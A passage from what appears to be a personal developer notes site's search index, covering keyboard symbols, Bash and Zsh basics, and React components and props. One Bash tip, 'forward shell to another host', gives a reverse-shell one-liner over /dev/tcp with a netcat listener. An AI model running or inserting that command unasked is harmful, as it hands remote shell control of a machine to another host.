Lock\n\n&lt;kbd&gt;&amp;#8984;&lt;/kbd&gt; Command\n\n&lt;kbd&gt;&amp;#8963;&lt;/kbd&gt; Control\n\n&lt;kbd&gt;&amp;#9003;&lt;/kbd&gt; Delete\n\n&lt;kbd&gt;&amp;#8998;&lt;/kbd&gt; Delete (Forward)\n\n&lt;kbd&gt;&amp;#8600;&lt;/kbd&gt; End\n\n&lt;kbd&gt;&amp;#8996;&lt;/kbd&gt; Enter\n\n&lt;kbd&gt;&amp;#9099;&lt;/kbd&gt; Escape\n\n&lt;kbd&gt;&amp;#8598;&lt;/kbd&gt; Home\n\n&lt;kbd&gt;&amp;#8670;&lt;/kbd&gt; Page Up\n\n&lt;kbd&gt;&amp;#8671;&lt;/kbd&gt; Page Down\n\n&lt;kbd&gt;&amp;#8997;&lt;/kbd&gt; Option, Alt\n\n&lt;kbd&gt;&amp;#8629;&lt;/kbd&gt; Return\n\n&lt;kbd&gt;&amp;#8679;&lt;/kbd&gt; Shift\n\n&lt;kbd&gt;&amp;#9251;&lt;/kbd&gt; Space\n\n&lt;kbd&gt;&amp;#8677;&lt;/kbd&gt; Tab\n\n&lt;kbd&gt;&amp;#8676;&lt;/kbd&gt; Tab + Shift\n</code></pre> <p>\u2191 Arrow Up</p> <p>\u2193 Arrow Down</p> <p>\u2190 Arrow Left</p> <p>\u2192 Arrow Right</p> <p>\u21ea Caps Lock</p> <p>\u2318 Command</p> <p>\u2303 Control</p> <p>\u232b Delete</p> <p>\u2326 Delete (Forward)</p> <p>\u2198 End</p> <p>\u2324 Enter</p> <p>\u238b Escape</p> <p>\u2196 Home</p> <p>\u21de Page Up</p> <p>\u21df Page Down</p> <p>\u2325 Option, Alt</p> <p>\u21b5 Return</p> <p>\u21e7 Shift</p> <p>\u2423 Space</p> <p>\u21e5 Tab</p> <p>\u21e4 Tab + Shift</p>"},{"location":"Dev/Prg/Langs/Shell/","title":"Shell","text":"<ul> <li> Command-line shell</li> <li>Unix Shells: Bash, Fish, Ksh, Tcsh, Zsh comparison</li> <li>Linux Handbook</li> <li> \u0410\u0432\u0442\u043e\u043c\u0430\u0442\u0438\u0447\u0435\u0441\u043a\u0438 \u0438\u0437\u043c\u0435\u043d\u044f\u0435\u043c \u0437\u0430\u0433\u043e\u043b\u043e\u0432\u043e\u043a \u044d\u043c\u0443\u043b\u044f\u0442\u043e\u0440\u0430 \u0442\u0435\u0440\u043c\u0438\u043d\u0430\u043b\u0430 \u043d\u0430 \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u044e\u044e \u0432\u0432\u0435\u0434\u0451\u043d\u043d\u0443\u044e \u043a\u043e\u043c\u0430\u043d\u0434\u0443</li> </ul> <p>256 colors for Terminal:</p> <ul> <li>Xterm256 color names for console Vim</li> <li>256 \u0446\u0432\u0435\u0442\u043e\u0432 \u0432 \u0442\u0435\u0440\u043c\u0438\u043d\u0430\u043b\u0435 \u21d2 \u0443\u0440\u043e\u0432\u0435\u043d\u044c nightmare(Habr)</li> <li>Color Builder for Terminal + </li> </ul>"},{"location":"Dev/Prg/Langs/Shell/#bash","title":"Bash","text":"<p>Reference:</p> <ul> <li>Bash Reference Manual</li> <li>Shell &amp; Utilities: Detailed Toc</li> </ul> <p>Bash Learning Sources</p> <ul> <li>Advanced Bash-Scripting Guide</li> <li>Learn X in Y minutes</li> <li>Bash Pitfalls</li> <li>\u0412\u0432\u0435\u0434\u0435\u043d\u0438\u0435 \u0432 Bash Shell(Habr)</li> <li> <p>Introduction to Advanced Bash Usage - James Pannacciulli @ OSCON 2014</p> <p></p> <p></p> </li> <li> <p> An introduction to parameter expansion in Bash</p> </li> </ul>"},{"location":"Dev/Prg/Langs/Shell/#bash-essentials","title":"Bash Essentials","text":""},{"location":"Dev/Prg/Langs/Shell/#bash-script-syntax","title":"Bash script syntax","text":"<pre><code>#! /bin/bash\n\n# ECHO COMMAND\necho Hello World!\n\n# VARIABLES\n# Uppercase by convention\n# Letters, numbers, underscores\nNAME=\"Bob\"\necho \"My name is $NAME\"\necho \"My name is ${NAME}\"\n\n# USER INPUT\nread -p \"Enter your name: \" NAME\necho \"Hello $NAME, nice to meet you!\"\n\n# SIMPLE IF STATEMENT\nif [ \"$NAME\" == \"Brad\" ]\nthen\necho \"Your name is Brad\"\nfi\n\n# IF-ELSE\nif [ \"$NAME\" == \"Brad\" ]\nthen\necho \"Your name is Brad\"\nelse\necho \"Your name is NOT Brad\"\nfi\n\n# ELSE-IF (elif)\nif [ \"$NAME\" == \"Brad\" ]\nthen\necho \"Your name is Brad\"\nelif [ \"$NAME\" == \"Jack\" ]\nthen\necho \"Your name is Jack\"\nelse\necho \"Your name is NOT Brad or Jack\"\nfi\n\n# COMPARISON\nNUM1=31\nNUM2=5\nif [ \"$NUM1\" -gt \"$NUM2\" ]\nthen\necho \"$NUM1 is greater than $NUM2\"\nelse\necho \"$NUM1 is less than $NUM2\"\nfi\n\n########\n# val1 -eq val2 Returns true if the values are equal\n# val1 -ne val2 Returns true if the values are not equal\n# val1 -gt val2 Returns true if val1 is greater than val2\n# val1 -ge val2 Returns true if val1 is greater than or equal to val2\n# val1 -lt val2 Returns true if val1 is less than val2\n# val1 -le val2 Returns true if val1 is less than or equal to val2\n########\n\n# FILE CONDITIONS\nFILE=\"test.txt\"\nif [ -e \"$FILE\" ]\nthen\necho \"$FILE exists\"\nelse\necho \"$FILE does NOT exist\"\nfi\n\n########\n# -d file   True if the file is a directory\n# -e file   True if the file exists (note that this is not particularly portable, thus -f is generally used)\n# -f file   True if the provided string is a file\n# -g file   True if the group id is set on a file\n# -r file   True if the file is readable\n# -s file   True if the file has a non-zero size\n# -u    True if the user id is set on a file\n# -w    True if the file is writable\n# -x    True if the file is an executable\n########\n\n# CASE STATEMENT\nread -p \"Are you 21 or over? Y/N \" ANSWER\ncase \"$ANSWER\" in\n[yY] | [yY][eE][sS])\necho \"You can have a beer :)\"\n;;\n[nN] | [nN][oO])\necho \"Sorry, no drinking\"\n;;\n*)\necho \"Please enter y/yes or n/no\"\n;;\nesac\n\n# SIMPLE FOR LOOP\nNAMES=\"Brad Kevin Alice Mark\"\nfor NAME in $NAMES\ndo\necho \"Hello $NAME\"\ndone\n\n# FOR LOOP TO RENAME FILES\nFILES=$(ls *.txt)\nNEW=\"new\"\nfor FILE in $FILES\ndo\necho \"Renaming $FILE to new-$FILE\"\nmv $FILE $NEW-$FILE\ndone\n\n# WHILE LOOP - READ THROUGH A FILE LINE BY LINE\nLINE=1\nwhile read -r CURRENT_LINE\n  do\necho \"$LINE: $CURRENT_LINE\"\n((LINE++))\ndone &lt; \"./new-1.txt\"\n\n# FUNCTION\nfunction sayHello() {\necho \"Hello World\"\n}\nsayHello\n\n# FUNCTION WITH PARAMS\nfunction greet() {\necho \"Hello, I am $1 and I am $2\"\n}\n\ngreet \"Brad\" \"36\"\n\n# CREATE FOLDER AND WRITE TO A FILE\nmkdir hello\ntouch \"hello/world.txt\"\necho \"Hello World\" &gt;&gt; \"hello/world.txt\"    # &gt;&gt; adds to file, &gt; overwrites a file\necho \"Created hello/world.txt\"\n</code></pre>"},{"location":"Dev/Prg/Langs/Shell/#bash-positional-parameterssource","title":"Bash Positional Parameters(source)","text":"<ul> <li><code>$0, $1, $2</code>, etc. - Positional parameters, passed from command line to script, passed to a function, or set to a variable.</li> <li><code>$#</code> - Number of command-line arguments or positional parameters.</li> <li><code>$*</code> - All of the positional parameters, seen as a single word. <code>$*</code> must be quoted.</li> <li><code>$@</code> - Same as <code>\"$*\"</code>, but each parameter is a quoted string, that is, the parameters are passed on intact, without interpretation or expansion. This means, among other things, that each parameter in the argument list is seen as a separate word. <code>\"$@\"</code> must be quoted.</li> <li><code>$#</code> - Number of arguments in <code>$*</code>.</li> </ul>"},{"location":"Dev/Prg/Langs/Shell/#other-special-parameters","title":"Other Special Parameters","text":"<ul> <li><code>$-</code> - Flags passed to script (using <code>set</code>).</li> <li><code>$$</code> - PID of the current process.</li> <li><code>$!</code> - PID of last job run in background.</li> <li><code>$?</code> - Return code of the last executed command.</li> <li><code>$_</code> - Final argument of previous command executed..</li> </ul>"},{"location":"Dev/Prg/Langs/Shell/#bash-shell-shortcuts","title":"Bash Shell Shortcuts","text":""},{"location":"Dev/Prg/Langs/Shell/#bash-configuration","title":"Bash configuration","text":""},{"location":"Dev/Prg/Langs/Shell/#compatibility-mode-with-vi-in-bash","title":"compatibility mode with vi in bash","text":"<pre><code># put this line in ~./bashrc\nset -o vi\n\n# put these lines in ~./inputrc\nset editing-mode vi\nset keymap vi\n</code></pre>"},{"location":"Dev/Prg/Langs/Shell/#bash-tips-tricks","title":"Bash Tips &amp; Tricks","text":""},{"location":"Dev/Prg/Langs/Shell/#useful-commands","title":"Useful Commands","text":""},{"location":"Dev/Prg/Langs/Shell/#show-the-current-folders-size","title":"show the current folder's size","text":"<pre><code>du -hs\n</code></pre>"},{"location":"Dev/Prg/Langs/Shell/#redirect-output-to-protected-file","title":"redirect output to protected file","text":"<pre><code># overwrite output to protected file\necho 16 | sudo tee /proc/sys/kernel/sysrq\n\n# append output to protected file\necho 16 | sudo tee -a /proc/sys/kernel/sysrq\n</code></pre>"},{"location":"Dev/Prg/Langs/Shell/#convert-pdf-to-jpg","title":"convert pdf to jpg","text":"<ol> <li> <p>using <code>pdftoppm</code> tool:</p> <p>Basic command format: <code>bash pdftoppm -jpeg -r 300 input.pdf output</code></p> <p>The <code>-jpeg</code> sets the output image format to JPG, <code>-r 300</code> sets the output image resolution to 300 DPI, and the word <code>output</code> will be the prefix to all pages of images, which will be numbered and placed into your current directory you are working in. A better way, in my opinion, however, is to use <code>mkdir -p images</code> first to create an \"images\" directory, then set the output to <code>images/pg</code> so that all output images will be placed cleanly into the <code>images</code> dir you just created, with the file prefix <code>pg</code> in front of each of their numbers.</p> <p>Therefore, here are my favorite commands:</p> <ol> <li> <p>[Produces ~1MB-sized files per pg] Output in .jpg format at 300 DPI:</p> <pre><code>mkdir -p images &amp;&amp; pdftoppm -jpeg -r 300 mypdf.pdf images/pg\n</code></pre> </li> <li> <p>[Produces ~2MB-sized files per pg] Output in .jpg format at highest quality (least compression) and still at 300 DPI:</p> <pre><code>mkdir -p images &amp;&amp; pdftoppm -jpeg -jpegopt quality=100 -r 300 mypdf.pdf images/pg\n</code></pre> </li> </ol> </li> <li> <p>using ImageMagick's <code>convert</code> tool:</p> <ol> <li> <p>install <code>imagemagick</code></p> </li> <li> <p>use <code>convert</code> like this:</p> <pre><code>convert input.pdf output.jpg\n\n# For good quality use these parameters\nconvert -density 300 -quality 100 in.pdf out.jpg\n</code></pre> </li> </ol> </li> </ol>"},{"location":"Dev/Prg/Langs/Shell/#forward-shell-to-another-host","title":"forward shell to another host","text":"<pre><code>bash -i &gt;&amp; /dev/tcp/&lt;host-ip&gt;/&lt;port&gt; 0&gt;&amp;1\n</code></pre> <p>Example:</p> <ol> <li> <p>On host machine run  <code>bash -i &gt;&amp; /dev/tcp/192.168.218.1/9999 0&gt;&amp;1</code> where:</p> <ol> <li><code>192.168.218.1</code> is the host to which you want to forward the shell(note that you can also use a hostname but I strongly suggest you use an IP to prevent issues with hostname-resolving)</li> <li><code>9999</code> is the port number on which the netcat listener will listen</li> </ol> </li> <li> <p>Start the netcat listener on the other side by running <code>nc -l 9999</code>.</p> <ol> <li>Double check that there are no firewall rules preventing you from accepting connections.</li> <li>Some versions of netcat require you to add <code>-p</code> before the port number.</li> </ol> </li> </ol>"},{"location":"Dev/Prg/Langs/Shell/#find","title":"\"find\"","text":"<ul> <li> 15 \u0441\u0443\u043f\u0435\u0440 \u043f\u043e\u043b\u0435\u0437\u043d\u044b\u0445 \u043f\u0440\u0438\u043c\u0435\u0440\u043e\u0432 \u043a\u043e\u043c\u0430\u043d\u0434\u044b find \u0432 Linux</li> </ul>"},{"location":"Dev/Prg/Langs/Shell/#run-commands-in-the-background","title":"Run Commands in the Background","text":"<ol> <li> <p>End a Command with &amp;</p> <p>Note</p> <p>When the terminal session is closed, the command ends. You can also kill the command by issuing the <code>jobs</code> command, finding the number of the command that\u2019s running, and killing it with the <code>kill</code> command: <code>kill %1</code></p> <p>Warning</p> <p>Using <code>&amp;</code> doesn\u2019t disconnect the command away from you; it just pushes it into the background. You can verify this by typing <code>jobs</code> into the terminal. This means that while you\u2019re trying to use the terminal, anything the command wants to push to <code>STDOUT</code> or <code>STDERR</code> will still be printed, which may be distracting, e.g. <code>ping google.com &amp;</code>. If you\u2019re looking to prevent this, consider redirecting the command to \u201c/dev/null\u201d: <code>COMMAND &amp;&gt;/dev/null &amp;</code></p> </li> <li> <p>&amp; After a Command, Then Disown It</p> <p>Note</p> <p>Using <code>disown</code> after running command with <code>&amp;</code> keep this command running in constant, even with your terminal session ending. It\u2019ll still keep piping things to <code>STDOUT</code> or <code>STDERR</code>, but once you exit and reopen your terminal, you won\u2019t see anything there. You can find the command again with the <code>top</code> or <code>ps</code> commands and kill it with the <code>kill</code> command.</p> </li> <li> <p>Nohup, with &amp; and /dev/null</p> <p>Note</p> <p><code>nohup</code> bypasses the HUP signal (signal hang up), making it possible to run commands in the background even when the terminal is off. Combine this command with redirection to \u201c/dev/null\u201d (to prevent nohup from making a nohup.out file), and everything goes to the background with one command: <code>nohup COMMAND &amp;&gt;/dev/null &amp;</code></p> </li> </ol>"},{"location":"Dev/Prg/Langs/Shell/#bash-utilities","title":"Bash Utilities","text":"<ul> <li>Basher - bash package manager</li> <li>dotenv</li> <li>bashew - bash script / project creator</li> <li>setver - get and set semver versions for php, node, github and bash</li> <li>  Trashy</li> </ul>"},{"location":"Dev/Prg/Langs/Shell/#zsh","title":"Zsh","text":"<ul> <li>\u041f\u0435\u0440\u0435\u0445\u043e\u0434 \u0441 bash \u043d\u0430 zsh(Habr)</li> <li> terminal-helpful-tips (7 Part Series)</li> <li> zsh: tips &amp; tricks(Habr) + github</li> <li> What are the practical differences between Bash and Zsh?</li> <li> Command Line Productivity with ZSH Aliases</li> <li> Learn the basics of the ZSH shell</li> <li> Getting started with Zsh</li> </ul> <p>MacOS:</p> <ul> <li>Moving to zsh</li> <li>Change cursor shape in different modes - for MacOS</li> </ul>"},{"location":"Dev/Prg/Langs/Shell/#zsh-essentials","title":"Zsh Essentials","text":""},{"location":"Dev/Prg/Langs/Shell/#zsh-configuration","title":"Zsh configuration","text":""},{"location":"Dev/Prg/Langs/Shell/#zsh-startup-and-shutdown-files-read-order","title":"zsh startup and shutdown files read order","text":"<p>Note</p> <p>Files starting with <code>.</code> are user-level configs and are located in the directory path set as value to the ZDOTDIR variable. If the value of this variable is an empty string, files are assumed to be in the user HOME directory.</p> <p> Login Interactive Shell </p> <ol> <li><code>/etc/zshenv</code> -&gt; <code>.zshenv</code> - are used to define environmental variables. They are always invoked each time a zsh session is started, therefore they should contain the less possible content. Only commands that don\u2019t produce output should be written in these files.</li> <li><code>/etc/zprofile</code> -&gt; <code>.zprofile</code> - can be used to run commands to setup login shell's context.</li> <li><code>/etc/zshrc</code> -&gt; <code>.zshrc</code> - are invoked when an interactive shell session is started. They are basically the counterpart of the /etc/bashrc and ~/.bashrc files for the BASH shell.</li> <li><code>/etc/zlogin</code> -&gt; <code>.zlogin</code> - are considered as an alternative to \u201cprofile\u201d files.</li> <li><code>.zlogout</code> -&gt; <code>/etc/zlogout</code> -  are run when a login shell session is closed.</li> </ol> <p> Non-Login Interactive Shell </p> <ol> <li><code>/etc/zshenv</code> -&gt; <code>.zshenv</code></li> <li><code>/etc/zshrc</code> -&gt; <code>.zshrc</code></li> </ol> <p> Non-Login Non-Interactive Shell (e.g. scripts) </p> <ol> <li><code>/etc/zshenv</code> -&gt; <code>.zshenv</code></li> </ol>"},{"location":"Dev/Prg/Langs/Shell/#zsh-utilities","title":"Zsh Utilities","text":"<ul> <li>awesome-zsh-plugins(GitHub)</li> </ul>"},{"location":"Dev/Prg/Langs/Shell/#oh-my-zsh","title":"Oh My Zsh","text":"<p>A delightful community-driven framework for managing your zsh configuration.</p> <ul> <li>Official Website</li> <li>Official Git</li> </ul>"},{"location":"Dev/Prg/LibsFwks/LibsFwks_Css/","title":"Css Libraries and Frameworks","text":""},{"location":"Dev/Prg/LibsFwks/LibsFwks_Css/#tachyons-css-toolkit","title":"Tachyons - css toolkit","text":"<p>Official Website</p> <p>Installation:</p> <pre><code>`npm install tachyons`\n\nor include in html:\n`&lt;link rel=\"stylesheet\" href=\"https://unpkg.com/tachyons@4/css/tachyons.min.css\"&gt;`\n</code></pre> <p>Usage examples:</p> <pre><code>Can have easy classname: `&lt;div className='f1 tc'&gt;` means font 1, text center.\n</code></pre>"},{"location":"Dev/Prg/LibsFwks/LibsFwks_Css/#reactstrap-react-bootstrap-4-components-library","title":"Reactstrap - react Bootstrap 4 components library","text":"<p>Official Website</p>"},{"location":"Dev/Prg/LibsFwks/LibsFwks_Css/#material-design-for-bootstrap-4-5-react-version-react-bootstrap-ui-kit","title":"Material Design for Bootstrap 4 &amp; 5 (React version) - react Bootstrap UI Kit","text":"<p>Official Website(for Bootstrap 4 &amp; React 16) Official Website(for Bootstrap 5 &amp; React 17)</p>"},{"location":"Dev/Prg/LibsFwks/LibsFwks_Css/#react-tilt","title":"React Tilt","text":"<p>npm: react-parallax-tilt</p>"},{"location":"Dev/Prg/LibsFwks/LibsFwks_Css/#tsparticle","title":"tsParticle","text":"<p>Official Demo Website npm: react-tsparticles</p>"},{"location":"Dev/Prg/LibsFwks/React/","title":"React","text":""},{"location":"Dev/Prg/LibsFwks/React/#react-essentials","title":"React Essentials","text":"<p>Reference:</p> <ul> <li> <p>Official website</p> </li> <li> <p>React/Redux Links </p> </li> <li> <p>Airbnb React/JSX Style Guide</p> </li> <li> <p>Learn React JS - Full Course for Beginners - Tutorial 2019 (by freeCodeCamp.org)</p> <p></p> </li> <li> <p>Full React Course 2020 - Learn Fundamentals, Hooks, Context API, React Router, Custom Hooks (by freeCodeCamp.org)</p> <p></p> </li> <li> <p>React JS Crash Course 2021</p> <p></p> </li> <li> <p>ReactJS - \u041f\u0443\u0442\u044c \u0421\u0430\u043c\u0443\u0440\u0430\u044f</p> <p></p> </li> <li> <p>React JS - \u041f\u0443\u0442\u044c \u0421\u0430\u043c\u0443\u0440\u0430\u044f 2.0</p> <p></p> </li> <li> <p>ReactJS. \u041e\u0441\u043d\u043e\u0432\u044b (\u0412\u043b\u0430\u0434\u0438\u043b\u0435\u043d \u041c\u0438\u043d\u0438\u043d)</p> <p></p> </li> </ul> <p>Cheatsheets:</p> <ul> <li>React Cheat Sheet</li> </ul> <p>Books:</p> <ul> <li> <p>Atomic Design by Brad Frost</p> </li> <li> <p>The React Handbook (by freeCodeCamp)</p> </li> </ul>"},{"location":"Dev/Prg/LibsFwks/React/#installation","title":"Installation","text":"<p>Installation made by using Create React App npm package:</p> <p>Official Docs, Github</p> <p>Note</p> <p>Create React App uses webpack, Babel, ESLint, and other amazing projects to power our app. If we ever want an advanced configuration, we can \u201deject\u201d from Create React App and edit their config files directly.</p> <p>Note</p> <p>Projects created with CRA are responsive out of the box.</p> <p>Quick Start:</p> <pre><code>npx create-react-app my-app\ncd my-app\nnpm start\n</code></pre>"},{"location":"Dev/Prg/LibsFwks/React/#deployment","title":"Deployment","text":"<p>Official Docs</p>"},{"location":"Dev/Prg/LibsFwks/React/#definition","title":"Definition","text":"<ul> <li> <p>React is a view library.</p> <p>Note</p> <p>A view is simply the web page we see. A page that displays the text, images of a website. If you build websites with HTML, then every page you create is the view like the homepage, about page, and the contact page. More precisely: a view is just another special template page that will be generated on the user request. It will display only the things that matter to the user\u2019s request(source).</p> </li> <li> <p>React helps to re-use component easily, change the view.</p> </li> </ul>"},{"location":"Dev/Prg/LibsFwks/React/#concepts","title":"Concepts","text":""},{"location":"Dev/Prg/LibsFwks/React/#one-way-data-flow","title":"One Way Data Flow","text":"<p>Change the parent, only their children need to be re-rendered.</p>"},{"location":"Dev/Prg/LibsFwks/React/#srcindexjs","title":"src/index.js","text":"<p>Index.js is the main \"JS\" file for React App. All packages/dependencies we import there, will be imported for all the subsequent files thus allowing us to use it everywhere.</p> <p>Warning</p> <p>This is true for importing React(<code>import React from 'react';</code>) in function-based dumb components as well since React v.17 and above, i.e. there is no need anymore to import react for JSX only. For older versions of React and for class-based components we still need to import it in each component file in order to make JSX work in the component when we compile it before bundling it up, i.e. because each module has it's own scope, it needs to understand JSX(Source: Stackoverflow). Underneath the hood, this is all compiled and bundled by webpack. Futher reading: Webpack Tutorial: Understanding How it Works</p> <pre><code>import React from 'react';\nimport ReactDOM from 'react-dom';\nimport './index.css';\nimport App from './containers/App';\nimport reportWebVitals from './reportWebVitals';\nimport 'tachyons';\n\n\nReactDOM.render(\n&lt;React.StrictMode&gt;\n&lt;App /&gt;\n&lt;/React.StrictMode&gt;,\ndocument.getElementById('root')\n);\n\n// If you want to start measuring performance in your app, pass a function\n// to log results (for example: reportWebVitals(console.log))\n// or send to an analytics endpoint. Learn more: https://bit.ly/CRA-vitals\nreportWebVitals();\n</code></pre> <p><code>import React from 'react';</code>: It's the core of the package that in our case(our website) does the DOM manipulation for us.</p> <p><code>import ReactDOM from 'react-dom';</code>: We can plug and play different libraries like React VR(for Virtual Reality) or React Native(for building mobile apps) based on what screen we're rendering to. Here we plug ReactDom library.</p> <p><code>import 'tachyons';</code>: Packages like this can just be imported in the index.js file because they can be \"global\" like dependencies that have to be imported just once. But technically it's not global. Webpack can convert these dependencies into modules - they will have a much tighter scope (which is safer). Additionally by converting our dependencies into Modules, Webpack can manage our dependencies for us - Webpack will pull in the dependant Modules at the right time, in the correct scope.</p> <p><code>render()</code> function: It is a built in function that connected to the ecosystem - which handles any changes in the view. This method should only contain the final result of what we want to return from the component.</p>"},{"location":"Dev/Prg/LibsFwks/React/#jsx","title":"JSX","text":"<p>React uses JSX language to build its own VirtualDOM. It looks like javascript with html-like syntax and has following rules:</p> <ol> <li> <p>Regarding self-closing elements both HTML (linebreak <code>&lt;br&gt;</code>, horizontal rule <code>&lt;hr&gt;</code>, <code>&lt;input&gt;</code> and <code>&lt;img&gt;</code>) and user defined (e.g. <code>&lt;CardList /&gt;</code>):</p> <p>In XML compliant HTML we must include the <code>/</code> in the tag. HTML5 permits us to not include a space character, so we may write,</p> <p><code>&lt;img/&gt;</code> or <code>&lt;img /&gt;</code></p> <p>React.js requires that we use the XHTML syntax, and always include a space. We cannot break up a self-closing tag. It must appear on the same line.</p> <p><code>&lt;br /&gt;</code></p> </li> <li> <p>Use <code>&lt;div className=''&gt;</code> instead of class</p> </li> <li> <p> <pre><code>return (html...\n{\njavascript expression\n}\nhtml...);\n</code></pre> <ul> <li> <p>html... - what the JSX processor does, essentially, is e.g. turn this:</p> <pre><code>&lt;div className=\"sidebar\"&gt;&lt;/div&gt;\n</code></pre> <p>into this:</p> <pre><code>React.createElement(\n'div',\n{className: 'sidebar'},\nnull\n)\n</code></pre> </li> <li> <p>{ javascript expression } - we need curly braces around js expressions to tell the compiler to distinguish between them and the remaining JSX(= only statements which we want to render out).</p> </li> <li> <p>return (...) - when we return multiple lines we have to wrap them with brackets to make a javascript expression.</p> </li> </ul>"},{"location":"Dev/Prg/LibsFwks/React/#components","title":"Components","text":"<p>React.Component(from official docs)</p> <ul> <li> <p>Component is like a function, and it need to be exported, need to be Capitalized.</p> </li> <li> <p>We always have to return just one element from a component. Previously, for this purpose we wrapped our components in <code>&lt;div&gt;&lt;/div&gt;</code>. From React 16.2 we can use <code>&lt;React.Fragment&gt;&lt;/React.Fragment&gt;</code> instead, which won't render in the actual Dom. Futher reading: Rendering child elements in React using Fragments. The use of Fragment is quite simple. If we don't want our component affecting the content flow in a specific way (because we might have done the basic layout in the parent component) and we still want to return more than one element, we can use Fragment to wrap the other elements because we can only return one element. In other words we should use Fragment every time we don't want the component which we import to have an effect on the other components on the page (from a layout point of few).</p> <p>Note</p> <p><code>Fragment</code> will act like there is nothing. By using a <code>div</code> instead of <code>Fragment</code>, we will end up getting a block element which get pushed onto the next line by default.</p> </li> <li> <p>In a Project Structure:</p> <ul> <li>src/components - includes dumb components</li> <li>src/containers - includes  smart components: things like pages or overall app container and their css</li> </ul> </li> <li> <p>Dumb/Pure(presentational) Components:</p> <ul> <li>Their only responsibility is to present something to the DOM.</li> <li>So they are only used to outsource special parts of the parent smart component.</li> <li>And we only have access to properties which such an component can receive from a smart.</li> <li>So technically, our view only rerenders because the parent smart component forces the child dumb component to do that.</li> <li> <p>The components themselves only have a <code>render()</code> method (they don\u2019t need any others) and are often just Javascript pure functions that receive something and return something(determenistic).</p> <pre><code>const Footer = (props) =&gt; {\nreturn(\n&lt;div&gt;\n&lt;ul&gt;\n&lt;li&gt;Footer Information&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/div&gt;\n)\n}\n</code></pre> </li> </ul> </li> <li> <p>Smart(container) Components:</p> <ul> <li>They are responsible for keeping track of state, i.e. we can use the state management of React and care about how the app works.</li> <li>So they used as an overall components which should dynamically change the view with new data.</li> <li>The container components pass the data down to the presentational components as props.</li> <li>These components also often contain other callback functions that are used to update the state and get passed down to their child components as props. E.g. we have access to the lifecycle hooks like <code>componentDidMount</code> wich is needed to to fetch(\u0438\u0437\u0432\u043b\u0435\u0447\u044c) data and <code>setState</code> at the right time.</li> <li> <p>They can be class-based components and have their own state defined in their <code>constructor()</code> functions or function-based components using hooks.</p> <p>Example of class-based smart component(without callback functions):</p> <pre><code>class App extends Component {\nconstructor(props){\nsuper(props);\n\nthis.state = {pictures : []};\n}\n}\n</code></pre> <p>Rule from official docs reference: If you don\u2019t initialize state and you don\u2019t bind methods, you don\u2019t need to implement a constructor for your React component.</p> <p>The constructor for a React component is called before it is mounted. When implementing the constructor for a <code>React.Component</code> subclass, you should call <code>super(props)</code> before any other statement. Otherwise, <code>this.props</code> will be undefined in the constructor, which can lead to bugs.</p> <p>Typically, in React constructors are only used for two purposes:</p> <ol> <li> <p>Initializing local state by assigning an object to <code>this.state</code>.</p> </li> <li> <p>Binding event handler methods to an instance.</p> </li> </ol> </li> <li> <p>Using props parameter inside <code>constructor()</code> and <code>super()</code> functions:</p> <p>In general, we can use props also in class based components.</p> <p>If <code>&lt;MyComponent/&gt;</code> would be a class based component, then this</p> <p><code>&lt;MyComponent prop1={\"I'm prop1\"} prop2={\"I'm prop2\"} /&gt;</code></p> <p>also works and we can use it with props.</p> <p>The only gotcha is, that we have to pass the props within the constructor if we wanna use them inside of the constructor:</p> <pre><code>constructor(props){\nsuper(props);\nconsole.log(props);\n}\n</code></pre> <p>And if we don't wanna use the props inside of the constructor, then <code>this.props</code> will be available in our class methods.</p> </li> </ul> </li> <li> <p>Smart Component vs Dumb Component Example:</p> <pre><code>// class-based smart component\nimport React, {Component} from 'react';\n\nclass Hello extends Component {\nrender() {\nreturn (\n&lt;div&gt;\n&lt;h1&gt;Hello world!&lt;/h1&gt;\n&lt;h3&gt;{this.props.greeting}&lt;/h3&gt;\n&lt;/div&gt;\n)\n}\n}\n</code></pre> <p>vs</p> <pre><code>// function-based dumb component\nimport React from 'react';\n\nconst Hello = (props) =&gt; {\nreturn (\n&lt;div&gt;\n&lt;h1&gt;Hello world!&lt;/h1&gt;\n&lt;h3&gt;{props.greeting}&lt;/h3&gt;\n&lt;/div&gt;\n)\n}\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/LibsFwks/React/#props","title":"Props","text":"<ul> <li><code>props</code> are inputs to a React component. They are data passed down from a parent component to a child component.</li> <li> <p><code>props</code> are simply things that come out of state.</p> <p>For example:</p> <p>given the following in the index.js:</p> <pre><code>ReactDOM.render(\n&lt;div&gt;\n&lt;Card id=array[0].id name=array[0].name email=array[0].email /&gt;\n&lt;/div&gt;\n)\n</code></pre> <p>we can get these props inside Card.js as follows:</p> <pre><code>// in class-based component\nclass Card extends React.Component {\nrender() {\nreturn (\n&lt;div&gt;\n&lt;h4&gt;{this.props.name}&lt;/h4&gt;\n&lt;p&gt;{this.props.email}&lt;/p&gt;\n&lt;p&gt;{this.props.id}&lt;/p&gt;\n&lt;/div&gt;\n);\n}\n}\n\n// in function-based component\nconst Card = (props) =&gt; {\nreturn (\n&lt;div&gt;\n&lt;h4&gt;{props.name}&lt;/h4&gt;\n&lt;p&gt;{props.email}&lt;/p&gt;\n&lt;p&gt;{props.id}&lt;/p&gt;\n&lt;/div&gt;\n);\n}\n\n// in function-based component using destructuring in function parameter\nconst Card = ({ name, email, id }) =&gt; {\nreturn (\n&lt;div&gt;\n&lt;h4&gt;{name}&lt;/h4&gt;\n&lt;p&gt;{email}&lt;/p&gt;\n&lt;p&gt;{id}&lt;/p&gt;\n&lt;/div&gt;\n);\n}\n\n// same as above but with example of passing prop into string usnin template string\nconst Card = ({ name, email, id }) =&gt; {\nreturn (\n&lt;div className=\"tc bg-light-green dib br3 pa3 ma2 grow bw2 shadow-5\"&gt;\n&lt;img src={`https://robohash.org/${id}?size=200x200`} alt=\"robots\" /&gt; // passing id using template string\n&lt;div&gt;\n&lt;h4&gt;{name}&lt;/h4&gt;\n&lt;p&gt;{email}&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n);\n}\n</code></pre> </li> <li> <p><code>props</code> are readonly. They should not be modified in any way. If you need to modify some value in response to user input or a network response, use <code>state</code> instead.</p> </li> <li> <p><code>props.children</code> is available on every component. It contains the content between the opening and closing tags of a component, e.g.:</p> <p>Given <code>&lt;Welcome&gt;Hello world!&lt;/Welcome&gt;</code> the string <code>Hello world!</code> is available in <code>props.children</code> (for function-based component) or <code>this.props.children</code> (for class-based component) in the <code>Welcome</code> component.</p> </li> </ul>"},{"location":"Dev/Prg/LibsFwks/React/#key-prop","title":"Key Prop","text":"<ul> <li> <p>Keys help React identify which items have changed, are added, or are removed. Keys should be given 